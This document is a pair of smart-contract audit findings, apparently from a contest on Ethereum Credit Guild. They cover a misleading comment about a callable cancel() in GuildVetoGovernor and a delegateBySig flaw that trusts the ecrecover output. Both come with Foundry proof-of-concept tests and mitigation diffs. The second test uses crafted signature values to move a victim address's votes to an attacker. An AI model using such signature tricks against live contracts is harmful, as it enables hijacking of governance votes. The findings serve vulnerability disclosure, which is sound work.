# The comments on GuildVetoGovernor say that there is no public cancel function, but there is, and it is callable

## Links to affected code

[https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/GuildVetoGovernor.sol#L238-L240](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/GuildVetoGovernor.sol#L238-L240)

[https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/GuildVetoGovernor.sol#L261](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/GuildVetoGovernor.sol#L261)

## Impact

Unlike comments , there is a public cancel function.

## Proof of Concept

The comment on GuildVetoGovernor says that it cannot be canceled because there is no public `cancel` function. However, there is actually a `cancel` function and it is callable.

This is not a big deal because the `state` function ignores the cancel state. You may want to explicitly override the `_cancel` function to disable it, as it may cause issues in future changes.

```solidity
    /// @notice State of a given proposal
    /// The state can be one of:
    /// - ProposalState.Pending   (0) Lasts only during the block where the veto proposal has been created.
    /// - ProposalState.Active    (1) If action is pending in the timelock and veto quorum has not been reached yet.
@>  /// - ProposalState.Canceled  (2) If a veto was created but the timelock action has been cancelled through another
@>  ///   mean before the veto vote succeeded. The internal _cancel() function is not reachable by another mean (no
@>  ///   public cancel() function), so this is the only case where a proposal will have Canceled status.
    /// - ProposalState.Defeated  (3) If proposal already executed or is ready to execute in the timelock.
    /// - ProposalState.Succeeded (4) If action is pending in the timelock and veto quorum has been reached. Veto can be executed instantly.
    /// - ProposalState.Executed  (7) If a veto successfully executed.
    /// note that veto proposals have a quorum that works with 'against' votes, and that only 'against' votes can be
    /// cast in this veto governor.
    function state(
        uint256 proposalId
    ) public view override returns (ProposalState) {
        ...
@>      // Proposal cannot be Canceled because there is no public cancel() function.
        // Vote has just been created, still in waiting period
        if (status == ProposalState.Pending) {
            return ProposalState.Pending;
        }
```

This is PoC. You can test it by adding it to GuildVetoGovernor.t.sol.

```solidity
function testPoCCancel() public {
    // schedule an action in the timelock
    bytes32 timelockId = _queueDummyTimelockAction(12345);

    // check status in the timelock
    assertEq(timelock.isOperationPending(timelockId), true);
    assertEq(timelock.isOperationReady(timelockId), false);
    assertEq(timelock.isOperationDone(timelockId), false);

    // create a veto proposal
    vm.roll(block.number + 1);
    vm.warp(block.timestamp + 10);
    token.mockSetVotes(address(this), _VETO_QUORUM);

    uint256 proposalId = governor.createVeto(timelockId);
    assertEq(
        uint256(governor.state(proposalId)),
        uint256(IGovernor.ProposalState.Pending)
    );
    assertEq(uint256(governor.proposalSnapshot(proposalId)), block.number);
    assertEq(
        uint256(governor.proposalDeadline(proposalId)),
        block.number + 2425847
    );

    // cannot vote in the same block as the propose()
    assertEq(governor.getVotes(address(this), block.number), _VETO_QUORUM); // we have the votes
    assertEq(governor.hasVoted(proposalId, address(this)), false); // we have not voted
    (
        uint256 againstVotes,
        uint256 forVotes,
        uint256 abstainVotes
    ) = governor.proposalVotes(proposalId);
    assertEq(againstVotes, 0); // nobody voted
    assertEq(forVotes, 0); // nobody voted
    assertEq(abstainVotes, 0); // nobody voted

    (
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        string memory description
    ) = _getVetoCalls(timelockId);
    // cancel
    governor.cancel(targets, values, calldatas, keccak256(bytes(description)));

    vm.roll(block.number + 1);
    vm.warp(block.timestamp + 10);

    // But ignored
    assertEq(
        uint256(governor.state(proposalId)),
        uint256(IGovernor.ProposalState.Active)
    );
}

function _getVetoCalls(
    bytes32 timelockId
)
    internal
    view
    returns (
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        string memory description
    )
{
    targets = new address[](1);
    targets[0] = address(timelock);
    values = new uint256[](1); // 0 eth
    calldatas = new bytes[](1);
    calldatas[0] = abi.encodeWithSelector(
        0xc4d252f5,
        timelockId
    );
    description = string.concat(
        "Veto proposal for ",
        string(abi.encodePacked(timelockId))
    );
}
```

## Tools Used

Manual Review

## Recommended Mitigation Steps

override `_cancel` function.

# delegateBySig - Invalid signatures may be accepted because the ecrecover result is used as a delegator

## Links to affected code

[https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/tokens/ERC20MultiVotes.sol#L483](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/tokens/ERC20MultiVotes.sol#L483)

[https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/tokens/ERC20MultiVotes.sol#L503-L504](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/tokens/ERC20MultiVotes.sol#L503-L504)

[https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/package.json#L27](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/package.json#L27)

## Impact

If the user enters an invalid signature, it will not revert.

## Proof of Concept

`delegateBySig` doesn’t get delegator(singer) parameter from caller and use `ecrecover` return value as delegator address. But the `ecrecover` function may return a non-zero value even if the signature is invalid.

It's unsafe to use the return value of `ecrecover` for any purpose other than comparing it with a valid signer value. 

```solidity
function delegateBySig(
        address delegatee,
        uint256 nonce,
        uint256 expiry,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public {
        require(
            block.timestamp <= expiry,
            "ERC20MultiVotes: signature expired"
        );
@>      address signer = ecrecover(
            keccak256(
                abi.encodePacked(
                    "\x19\x01",
                    _domainSeparatorV4(),
                    keccak256(
                        abi.encode(
                            DELEGATION_TYPEHASH,
                            delegatee,
                            nonce,
                            expiry
                        )
                    )
                )
            ),
            v,
            r,
            s
        );
        require(nonce == _useNonce(signer), "ERC20MultiVotes: invalid nonce");
        require(signer != address(0));
@>      _delegate(signer, delegatee);
    }
```

This is PoC. Put it in the ERC20MultiVotes.t.sol file and you can run it.

```solidity
function testPoCDelegateBySig() public {
    uint256 mintAmount = 500;
    address oldDelegatee = address(0xcafe);
    address attacker = address(0x1337);
    uint256 beforeDelegateAmount = 100;

    uint8 v_manipulated = 27;
    bytes32 r_manipulated = 0xcd7131732b50aeddb0b4ed935238859e6cb8d0faae7f0c1f5756e34d8ceead30;
    bytes32 s_manipulated = 0x6edfe0697454a340b905f4d17a7d44cead88ed09267058270b088e2bcfcb96b7;
    // This manipulated signature is treated as belonging to this random victim.
    address manipulatedAddress_owner = ecrecover(
        keccak256(
            abi.encodePacked(
                "\x19\x01",
                token.DOMAIN_SEPARATOR(),
                keccak256(
                    abi.encode(
                        token.DELEGATION_TYPEHASH(),
                        attacker,
                        0,
                        block.timestamp
                    )
                )
            )
        ),
        v_manipulated,
        r_manipulated,
        s_manipulated
    );

    // This random victim has tokens
    token.mint(manipulatedAddress_owner, mintAmount);
    token.setMaxDelegates(2);

    vm.prank(manipulatedAddress_owner);
    token.incrementDelegation(oldDelegatee, beforeDelegateAmount);

    uint256 expected = attacker == address(0) ? 0 : mintAmount;
    uint256 expectedFree = attacker == address(0) ? mintAmount : 0;

    token.delegateBySig(attacker, 0, block.timestamp, v_manipulated, r_manipulated, s_manipulated);

    require(
        oldDelegatee == attacker ||
            token.delegatesVotesCount(manipulatedAddress_owner, oldDelegatee) == 0
    );
    require(token.delegatesVotesCount(manipulatedAddress_owner, attacker) == expected);
    require(token.userDelegatedVotes(manipulatedAddress_owner) == expected);
    require(token.getVotes(attacker) == expected);
    require(token.freeVotes(manipulatedAddress_owner) == expectedFree);
}
```

## Tools Used

Manual Review

## Recommended Mitigation Steps

Check that the ecrecover result is the same as intended and that the signature is valid. 

```diff
function delegateBySig(
+       address delegator,
        address delegatee,
        uint256 nonce,
        uint256 expiry,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public {
        require(
            block.timestamp <= expiry,
            "ERC20MultiVotes: signature expired"
        );
        address signer = ecrecover(
            keccak256(
                abi.encodePacked(
                    "\x19\x01",
                    _domainSeparatorV4(),
                    keccak256(
                        abi.encode(
                            DELEGATION_TYPEHASH,
                            delegatee,
                            nonce,
                            expiry
                        )
                    )
                )
            ),
            v,
            r,
            s
        );
        require(nonce == _useNonce(signer), "ERC20MultiVotes: invalid nonce");
        require(signer != address(0));
+       require(signer == delegator, "wrong signature");
        _delegate(signer, delegatee);
    }
```

And Openzeppelin v4.9.3 Governor has the same problem. It fixed in v5.0.0, so we recommend you to raise your library version.